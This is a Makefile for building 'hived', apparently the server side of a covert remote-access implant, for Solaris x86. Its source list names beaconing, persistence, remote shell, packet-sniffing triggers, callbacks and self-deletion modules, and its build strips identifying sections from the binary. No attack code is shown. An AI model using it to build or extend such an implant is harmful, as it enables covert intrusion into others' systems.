#------------------------------------------------
#Makefile for compiling Solaris-x86 
# Makefile.solaris-x86
#
# For other possible targets, please enter:
#	
#		make all
#
#------------------------------------------------


BIN = .
LIB = .

CLIENT_BASENAME = hive
SERVER_BASENAME = hived

POLARSSL = polarssl
BZIP2 = bzip/bzip2-1.0.6
INCLUDES = -I$(POLARSSL)/include -I$(BZIP2) -I../libs
LIBPOLARSSL = $(POLARSSL)/library/libpolarssl.a
LIBBZIP2 = $(BZIP2)/libbz2.a

SERVER_SRCS = beacon.c persistence.c launchshell.c \
	shuffle.c twofish.c farm9crypt.c jshell.c \
	survey_mac.c survey_uptime.c trigger_listen.c trigger_callback_session.c daemonize.c \
	main.c init_strings.o string_utils.o tiny_crc16.c \
	trigger_b64.c trigger_payload.c trigger_sniff.c \
	client_session.c threads.c run_command.c self_delete.c $(POLARSSL)/crypto.c $(LIBPOLARSSL) \
	get_data.c process_list.c netstat_an.c netstat_rn.c ifconfig.c compression.c $(LIBBZIP2)

#OBJECTS = $(SRCS:%.c=%.o)
CFLAGS += -Os -W -Wall -D_X86 -D_FILE_OFFSET_BITS=64 -m32 -lpthread
CFLAGS += $(INCLUDES) -D__BYTE_ORDER=LITTLE_ENDIAN
DBGFLAGS += -DDEBUG -D_DEBUG -g

STRIPFLAGS += --strip-all --remove-section=.comment --remove-section=.note

OS = $(shell uname)

ifeq ($(OS),SunOS)
CFLAGS += -DSOLARIS
ARCH = $(shell uname -p)
SERVER = $(SERVER_BASENAME)-solaris-$(ARCH)
endif

.PHONY: all
all: $(SERVER) $(SERVER)-dbg

polarssl: $(LIBPOLARSSL)

$(LIBPOLARSSL): strings
	cd $(POLARSSL)/library && $(MAKE) -f Makefile.solaris-x86
bzip:   $(LIBBZIP2)

bzip2:  $(LIBBZIP2)

$(LIBBZIP2):
	cd $(BZIP2) && $(MAKE) -f Makefile.solaris-x86 libbz2.a

.PHONY: debug
debug: $(LIBPOLARSSL) $(SERVER)-dbg

.PHONY: release
release: $(LIBPOLARSSL) $(SERVER)

$(SERVER): strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),SunOS)
	gcc $(CFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -lsocket -lnsl -lresolv -o $(BIN)/$(SERVER)
	strip $(BIN)/$(SERVER)
	md5 $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
endif

$(SERVER)-dbg: strings $(LIBPOLARSSL) $(LIBBZIP2)
ifeq ($(OS),SunOS)
	gcc $(CFLAGS) $(DBGFLAGS) $(COMMON_SRCS) $(SERVER_SRCS) -L$(LIB) -lsocket -lnsl -lresolv -o $(BIN)/$(SERVER)-dbg
	md5 $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
endif

.PHONY: strings
strings: init_strings.o string_utils.o

init_strings.o: init_strings.c string_utils.o
	gcc -c init_strings.c

init_strings.c: server_strings.txt string_utils.h
	python mod_gen_string_header.py server_strings.txt SERVER_STRINGS

string_utils.o: string_utils.h string_utils.c
	gcc -c string_utils.c 

.PHONY: clean
clean:
	make -f ./Makefile clean

.PHONY: svnclean
svnclean: clean

.PHONY: md5
md5: all
	md5 $(BIN)/$(SERVER)-dbg > $(BIN)/$(SERVER)-dbg.md5
	md5 $(BIN)/$(SERVER) > $(BIN)/$(SERVER).md5
	
.PHONY: tarball
tarball:
	make -f ./Makefile tarball
